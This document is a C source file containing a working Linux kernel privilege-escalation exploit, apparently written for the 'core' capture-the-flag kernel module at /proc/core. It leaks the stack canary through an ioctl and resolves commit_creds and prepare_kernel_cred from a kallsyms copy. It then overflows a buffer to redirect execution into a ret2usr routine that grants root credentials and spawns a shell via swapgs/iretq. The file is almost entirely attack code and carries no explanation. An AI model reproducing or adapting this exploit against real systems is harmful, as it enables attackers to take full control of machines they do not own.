
#include <stdio.h>
#include <sys/ioctl.h> // ioctl()
#include <string.h> // memcpy()
#include <fcntl.h> // O_RDWR
#include <stdint.h> // uint64_t 
#include <unistd.h> // open()
#include <stdlib.h> // exit()

int __attribute__((regparm(3)))(*commit_creds)(void*);
void* __attribute__((regparm(3)))(*prepare_kernel_cred)(void*);

struct trap_frame
{
    void *rip;
    uint64_t cs; // code segment
    uint64_t rflags; // CPU flags
    void *rsp; // stack pointer
    uint64_t ss; // stack segment
}__attribute__((packed));
struct trap_frame tf;

unsigned long get_symbol(const char* name)
{
    FILE *fd;
    char buf[0x100];
    char addr[32];

    fd = fopen("/tmp/kallsyms","r");
    if(fd < 0)
    {
        printf("[-] Failed to open /tmp/kallsyms\n");
        exit(-1);
    }

    memset(buf, 0,sizeof(buf));
	
    while(fgets(buf,0x100,fd) != NULL)
    {
        char *p = buf;
        char *a = addr;

        if(strlen(buf) == 0)
            continue;

        memset(addr,0,sizeof(addr));
        buf[strlen(buf)-1] = '\0';

        while(*p != ' ')   
            *a++ = *p++;

        p += 3;
        if(!strcmp(p,name))
            return strtoul(addr, NULL, 16);
    }

    return 0;
}

// get shell after privilged
void get_shell(){
    printf("[+] get shell\n");
    system("/bin/sh");
}

// save stack frame
void save_trapframe(){
    asm("mov tf+8, cs;"
        "pushf; pop tf+16;"
        "mov tf+24, rsp;"
        "mov tf+32, ss;"
    );
    tf.rip = &get_shell;

    printf("[+] trap frame backuped\n");
}

void exploit(){
    commit_creds(prepare_kernel_cred(0)); // set cred struct field to 0
    asm("swapgs;"
        "mov %%rsp, %0;" // get backuped trap frame 
        "iretq;" // restruct saved trap frame content by iretq
        ::"r"(&tf)
    );
}

int main(){
    char buf[0x100];
    char canary[8];
    char rop[0x100];

    // init_module()
    int fd = open("/proc/core", O_RDWR); 
    if(fd < 0){
        fprintf(stderr, "[-] File open error\n");
        exit(-1);
    }
    
    printf("[+] File opened\n");    
    
    // off(global) value setting
    ioctl(fd, 0x6677889C, 0x40);

    // core_read() - save canary
    ioctl(fd, 0x6677889B, buf);
    printf("[+] canary: ");
    // copy 8byte canary
    memcpy(canary, buf, 8);
    for(int i=7; i>=0; i--)
        printf("%02x", canary[i] & 0xFF);
    printf("\n");

    // get kernel symbol of commit_creds, prepare_kernel_cred 
    commit_creds = get_symbol("commit_creds");
    
    if(commit_creds == 0){
        printf("[-] Filed to get commit_creds addr\n");
        exit(-1);
    }
    printf("[+] commit_creds: %p\n", commit_creds);

    prepare_kernel_cred = get_symbol("prepare_kernel_cred");
    if(prepare_kernel_cred == 0){
        printf("[-] Filed to get prepare_kernel_cred addr\n");
        exit(-1);
    }
    printf("[+] prepare_kernel_cred: %p\n", prepare_kernel_cred);


    // exploit payload setting 
    memset(rop, 0x41, 0x40); // 'A'*0x40 
    memcpy(rop+0x40, canary, 8); 
    memset(rop+0x48, 0x42, 8); // SFP
    *(void**)(rop+0x50) = &exploit; // set return address to exploit addr

    // save user register info
    save_trapframe(); 
    
    // copy payload data to name(global)
    write(fd, rop, 0x58);

    printf("[+] set name to payload\n");
    
    // core_copy_func() - overwrite core_copy_func return address 
    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | sizeof(rop));

    // exit_core()
    close(fd);
    return 0;

}
